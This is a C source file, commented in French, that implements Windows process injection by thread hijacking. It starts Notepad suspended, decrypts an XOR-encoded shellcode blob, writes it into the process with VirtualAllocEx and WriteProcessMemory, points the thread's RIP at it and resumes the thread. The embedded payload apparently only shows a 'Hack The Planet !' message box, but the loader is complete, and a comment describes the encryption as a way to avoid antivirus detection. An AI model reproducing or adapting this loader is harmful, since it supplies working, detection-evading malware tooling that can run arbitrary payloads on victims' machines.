#include <Windows.h>
#include <stdio.h>

#define MAX_PATH 260 

/*pas utile ici 
void DummyFunction(){
     printf("Hello\n");  
}*/

void XOR(unsigned char key, unsigned char *buf, int size) {
    for (int i = 0; i < size; i++) {
        buf[i] ^= key;
    }
}

int main(int argc, char * argv[]){

unsigned char  shellcode [] = 
"\xee\x5a\x93\xf6\xe2\xed\xed\xed\xfa\xde\x12\x12\x12\x53\x43\x53"
"\x42\x40\x5a\x23\xc0\x43\x77\x5a\x99\x40\x72\x44\x5a\x99\x40\x0a"
"\x5a\x99\x40\x32\x5f\x23\xdb\x5a\x1d\xa5\x58\x58\x5a\x99\x60\x42"
"\x5a\x23\xd2\xbe\x2e\x73\x6e\x10\x3e\x32\x53\xd3\xdb\x1f\x53\x13"
"\xd3\xf0\xff\x40\x53\x43\x5a\x99\x40\x32\x99\x50\x2e\x5a\x13\xc2"
"\x74\x93\x6a\x0a\x19\x10\x1d\x97\x60\x12\x12\x12\x99\x92\x9a\x12"
"\x12\x12\x5a\x97\xd2\x66\x75\x5a\x13\xc2\x42\x56\x99\x52\x32\x99"
"\x5a\x0a\x5b\x13\xc2\xf1\x44\x5f\x23\xdb\x5a\xed\xdb\x53\x99\x26"
"\x9a\x5a\x13\xc4\x5a\x23\xd2\xbe\x53\xd3\xdb\x1f\x53\x13\xd3\x2a"
"\xf2\x67\xe3\x5e\x11\x5e\x36\x1a\x57\x2b\xc3\x67\xca\x4a\x56\x99"
"\x52\x36\x5b\x13\xc2\x74\x53\x99\x1e\x5a\x56\x99\x52\x0e\x5b\x13"
"\xc2\x53\x99\x16\x9a\x53\x4a\x5a\x13\xc2\x53\x4a\x4c\x4b\x48\x53"
"\x4a\x53\x4b\x53\x48\x5a\x91\xfe\x32\x53\x40\xed\xf2\x4a\x53\x4b"
"\x48\x5a\x99\x00\xfb\x59\xed\xed\xed\x4f\xfa\x19\x12\x12\x12\x67"
"\x61\x77\x60\x21\x20\x3c\x76\x7e\x7e\x12\x4b\x53\xa8\x5e\x65\x34"
"\x15\xed\xc7\x5b\xd5\xd3\x12\x12\x12\x12\xfa\x00\x12\x12\x12\x5a"
"\x73\x71\x79\x32\x46\x7a\x77\x32\x42\x7e\x73\x7c\x77\x66\x32\x33"
"\x12\x48\xfa\x17\x12\x12\x12\x5a\x53\x5a\x53\x12\x53\x4a\x5a\x23"
"\xdb\x53\xa8\x57\x91\x44\x15\xed\xc7\xa9\xf2\x0f\x38\x18\x53\xa8"
"\xb4\x87\xaf\x8f\xed\xc7\x5a\x91\xd6\x3a\x2e\x14\x6e\x18\x92\xe9"
"\xf2\x67\x17\xa9\x55\x01\x60\x7d\x78\x12\x4b\x53\x9b\xc8\xed\xc7";

//intialisation des variables pour la fonction GetEnvironmentVariableA
char VarPath [MAX_PATH];  //260*2 = 520 de taille
char BufferEnvVar [MAX_PATH]; 
//unsigned char * ProcessName = "explorer.exe"; 
char * FullPathToProcess = "C:\\windows\\system32\\Notepad.exe"; 

//intialisation des variables pour la fonction CreateProcessA

char AppName [MAX_PATH]; 
char AppCmd [MAX_PATH]; 
STARTUPINFO si = {0};  //structure startup info
PROCESS_INFORMATION pi = {0}; //structure process info

//on remet BIEN à zéro les structures : 

RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

//on a besoin d'initialisé la taille de la structure startupinfo 
si.cb = sizeof(STARTUPINFO); 


//on initialise les variables poour le thread hijacking : 
PVOID pAddress = 0; 
int ShellSize = sizeof(shellcode); 
CONTEXT ThreadCTX = { .ContextFlags = CONTEXT_CONTROL };
DWORD OldProtection = 0;
unsigned char bkey = 0x12; 
SIZE_T bytesWritten = 0; 



//ensuite on peut récupérer la valeur de la variable d'environment WINDIR 
//if(!GetEnvironmentVariableA("WINDIR", BufferEnvVar, sizeof(BufferEnvVar)/*ou on aurait pu mettre MAX_PATH*/)) return FALSE;  

/*on peut créer un full path vers la victime (process.exe) avec des printf (juste pour le kiff)
	 Creating the full target process path 
	sprintf(VarPath, "%s\\System32\\%s", BufferEnvVar, ProcessName); //ici VarPath va récupérer l'ensemble de ce qui est mis en "". 
	printf("\n\t[i] Running : \"%s\" ... ", VarPath);*/ //ici varpath = "C:\Windows\System32\explorer.exe" */


//on doit ouvrir un faux processus (dummy)
//on aurait pu mettre FullPathToProcess en premier parametre (ça revient plus ou moins au meme)
if(!CreateProcessA(NULL, FullPathToProcess, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return FALSE; 


//le processus est crée et maintenant on doit injecter notre paylaod dans un thread de ce process : 
//on récupère les valeurs nécéssaires pour continuer grace à la structure PROCESS_INFORMATION 

HANDLE hProcess = pi.hProcess; 
HANDLE hThread = pi.hThread; 
DWORD dwThreadId = pi.dwThreadId;

//on peut checker que tout est bon : 
if (hProcess == NULL || hThread == NULL) return FALSE; 

//et on fait notre thread hijacking sans faire de dummy function: 

//we decrypt the shellcode with XOR before injecting it into the target process, we will encrypt it again after the injection to avoid detection by AV
XOR(bkey, shellcode, ShellSize);

//ensuite on doit allouer de la mémoire pour le payload
pAddress = VirtualAllocEx(hProcess, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
if (pAddress == NULL) return -1;

printf("\n\t[i] Allocated Memory At : 0x%p \n", pAddress);

//on utilise ici les étapes classique d'injection dans un process donc on alloue de la taille dans le thread.


printf("\t[#] Press <Enter> To Write Payload ... ");
	getchar();
 //we write the shellcode to the allocated memory in the target process
if (!WriteProcessMemory(hProcess, pAddress, shellcode , ShellSize, &bytesWritten)) { 
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

	printf("\t[i] Successfully Written %d Bytes\n", bytesWritten);

//on change la protection de la mémoire allouer : 

if(!VirtualProtectEx(hProcess, pAddress, ShellSize, PAGE_EXECUTE_READWRITE, &OldProtection)){
    return -1; 
} 


//ensuite on récupère le contexte de ce thread : 
if(!GetThreadContext(hThread, &ThreadCTX)){
    return -1; 
} 

//on change l'instruction suivante à l'adresse allouer pour le shellcode
ThreadCTX.Rip = pAddress;

if(!SetThreadContext(hThread, &ThreadCTX)){
    return -1; 
}


	printf("\n\t[#] Press <Enter> To Run ... ");
	getchar();

// 6. Sauvegarder l'adresse de retour originale (optionnel)
// ThreadCTX.Rsp contient la stack, on pourrait sauvegarder l'adresse de retour

//on résumé le thread de base (qui est la dummy function)
ResumeThread(hThread); 

WaitForSingleObject(hThread, INFINITE);
// Fermer les handles
CloseHandle(hThread);
CloseHandle(hProcess);

return 0; 


}